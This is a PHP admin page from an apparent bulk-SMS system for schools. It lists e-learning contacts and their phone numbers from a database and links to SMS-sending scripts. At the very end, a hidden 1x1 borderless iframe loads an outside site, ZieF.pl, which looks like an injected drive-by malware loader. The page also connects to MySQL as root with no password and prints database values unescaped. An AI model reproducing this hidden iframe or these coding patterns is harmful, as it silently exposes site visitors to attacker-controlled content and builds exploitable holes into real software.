<?php
ob_start();
//error_reporting(0);
?>
<?php
include('header.php');
?>
<body>

    <?php //include('navhead_user.php'); ?>

    <div class="container">
        <div class="row-fluid">
            <div class="span3">
                <div class="hero-unit-3">
                    <div class="alert-index alert-success">
                        <i class="icon-calendar icon-large"></i>
                        <?php
                        $Today = date('y:m:d');
                        $new = date('l, F d, Y', strtotime($Today));
                        echo $new;
                        ?>
                    </div>
                </div>
                <div class="hero-unit-1">
                <ul class="nav  nav-pills nav-stacked">
                    <ul class="nav  nav-pills nav-stacked">
                        <li class="nav-header">NAVIGATE</li>
                        <li   class="active">
                            <a href="main.php"><i class="icon-home icon-large"></i>&nbsp;Home
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>
                                </div>  
                            </a>

                        </li>
                        <li>
                            <a href="register_parent.php"><i class="icon-group icon-large"></i>&nbsp;PARENTS
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>

                                    <li>
                            <a href="register_teachers.php"><i class="icon-group icon-large"></i>&nbsp;TEACHERS
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>


                                    <li>
                            <a href="register_schools.php"><i class="icon-group icon-large"></i>&nbsp;SCHOOLS
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>


                                    <li>
                            <a href="register_elearning_contacts.php"><i class="icon-group icon-large"></i>&nbsp;ELEARNING
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>

                                    <li>
                            <a href="register_university_contacts.php"><i class="icon-group icon-large"></i>&nbsp; UNIVERSITY
                                <div class="pull-right">
                                    <i class="icon-double-angle-right icon-large"></i>

                                </div>  
                            </a></li>  
                            </a></li> 
                            </a></li>
                </div>

            </div>
            <div class="span9">
               
                <br></br>
                <div class="hero-unit-3">
                    <table cellpadding="0" cellspacing="0" border="0" class="table table-striped table-bordered" id="example">
                        <div class="alert alert-info">
                            <button type="button" class="close" data-dismiss="alert">&times;</button>
                            <strong><i class="icon-user icon-large"></i>&nbsp;ELEARNING CONTACTS</strong>
                        </div>
         <center>

  <table border="1" class="table table-striped table-bordered">  
<tr>

                      
<td>NAME</td>
<td>LEVEL</td>
<td>SUBJECT</td>

<td>CONTACT 1</td>
<td>CONTACT 2</td>
<td>CONTACT 3</td>
<td>ACTION ONE</td>
<td>ACTION TWO</td>
</tr>

<?php




$con=mysql_connect("localhost","root","");
 if(!$con){
echo"connection failed".mysql_error();

}

$selectdb=mysql_select_db("bulk_sms",$con);

 if(!$selectdb){
echo"database selection failed".mysql_error();

}

$selectclans="select * from group_elearning ";
$sql2=mysql_query($selectclans);

while($row=mysql_fetch_array($sql2)){
echo"<tr>";
//echo '<td>'.$row["id"].'</td>';

echo '<td>'.$row["name"].'</td>';
echo '<td>'.$row["level"].'</td>';
echo '<td>'.$row["subject"].'</td>';
//echo '<td>'.$row["sname"].'</td>';
echo '<td>'.$row["contact"].'</td>';
echo '<td>'.$row["contact2"].'</td>';
echo '<td>'.$row["contact3"].'</td>';

?>

<td><a href="sendsmsToAllelearning.php?tel=<?php echo $row['contact'].','. $row['contact2'].','.$row['contact3']; ?>">Send To All</a></td>

<td><a href="sendsmsToelearningSpecificlevelandsubject.php?level=<?php echo $row['level']; ?>&subject=<?php echo $row['subject']; ?>">Send To One Level And Subject</a></td>


<?php



}
?>

</tr>
</table>


</center>

                            </tr>
                        <?php //} ?>
                        </tbody>
                    </table>
                    <!-- end slider -->
                </div>
            </div>

        </div>
        <?php include('footer.php'); ?>
    </div>
</div>
</div>






<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>


